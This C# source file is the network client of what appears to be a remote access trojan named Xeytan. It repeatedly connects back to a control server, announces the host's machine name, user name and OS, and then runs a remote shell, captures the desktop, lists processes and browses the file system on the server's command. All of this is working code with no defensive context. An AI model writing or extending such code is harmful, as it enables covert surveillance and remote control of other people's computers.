using NetLib.Models;
using NetLib.Packets;
using NetLib.Services;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace XeytanCSharpClient.Net
{
    class NetClientService : NetClientServiceThreadSafeSender
    {
        public XeytanApplication Application { get; set; }

        public NetClientService()
        {
        }

        public override void Start()
        {
            base.Start();
            Running = true;
            StartNetSession();
        }

        private void StartNetSession()
        {
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Loopback, 3002);
            TcpClient tcpClient = new TcpClient();
            while (true)
            {
                try
                {
                    Console.WriteLine("Trying to make the connection");
                    tcpClient.Connect(endpoint);
                    SetTcpClient(tcpClient);

                    EnqueuePacket(new PacketPresentation
                    {
                        SystemInfo = new SystemInfo
                        {
                            PcName = Environment.MachineName,
                            UserName = Environment.UserName,
                            OperatingSystem = Environment.OSVersion.ToString(),
                            DotNetVersion = Environment.Version.ToString()
                        }
                    });

                    Interact();
                }
                catch (SocketException exception)
                {
                    Console.WriteLine("Socket Exception {0}", exception);
                    Thread.Sleep(5 * 1000);
                }
            }
        }

        protected override void OnException(Exception exception)
        {
            ShutdownConnection();
            Thread.Sleep(5 * 1000);
            StartNetSession();
        }

        protected override void OnPacketReceived(Packet packet)
        {
            switch (packet.PacketType)
            {
                case PacketType.Information:
                    Application.OnSystemInformationRequested();
                    break;
                case PacketType.Process:
                    Application.OnProcessListRequested();
                    break;
                case PacketType.Desktop:
                    Application.OnDesktopRequest(((PacketDesktop) packet).DesktopAction);
                    break;
                case PacketType.Shell:
                    PacketShell packetShell = (PacketShell) packet;
                    Application.OnShellRequested(packetShell.ShellAction, packetShell.Data);
                    break;
                case PacketType.FileSystem:
                {
                    PacketFileSystem packetFs = ((PacketFileSystem) packet);
                    string path = packetFs.BasePath;
                    if (packetFs.FsFocus == PacketFileSystem.FileSystemFocus.Roots
                        || path == null || path.Trim().Equals("") || path.Trim().Equals("/"))
                        Application.OnRootsRequested();
                    else
                        Application.OnListDirRequested(packetFs.BasePath);
                    break;
                }

                default:
                    Trace.WriteLine("PacketType not Handled");
                    break;
            }
        }

        public void SendSystemInformation(SystemInfo systemInfo)
        {
            var packet = new PacketSystemInformation
            {
                SystemInfo = systemInfo
            };

            EnqueuePacket(packet);
        }

        public void SendFileSystemRoots(List<DiskDriveInfo> diskDrives)
        {
            EnqueuePacket(new PacketFileSystem
            {
                FsFocus = PacketFileSystem.FileSystemFocus.Roots,
                Drives = diskDrives
            });
        }

        public void SendFileSystemEntries(string path, List<FileInfo> files)
        {
            EnqueuePacket(new PacketFileSystem
            {
                FsFocus = PacketFileSystem.FileSystemFocus.DirectoryEntries,
                BasePath = path,
                Files = files
            });
        }

        public void SendProcessList(List<ProcessInfo> processInfos)
        {
            EnqueuePacket(new PacketProcess
            {
                Processes = processInfos
            });
        }

        public void SendShellOutput(string output)
        {
            EnqueuePacket(new PacketShell
            {
                ShellAction = ShellAction.Push,
                Data = output
            });
        }

        public void SendShellStop()
        {
            EnqueuePacket(new PacketShell
            {
                ShellAction = ShellAction.Stop
            });
        }

        public void SendDesktopImage(byte[] imageData)
        {
            EnqueuePacket(new PacketDesktop
            {
                DesktopAction = DesktopAction.Push,
                ImageData = imageData
            });
        }
    }
}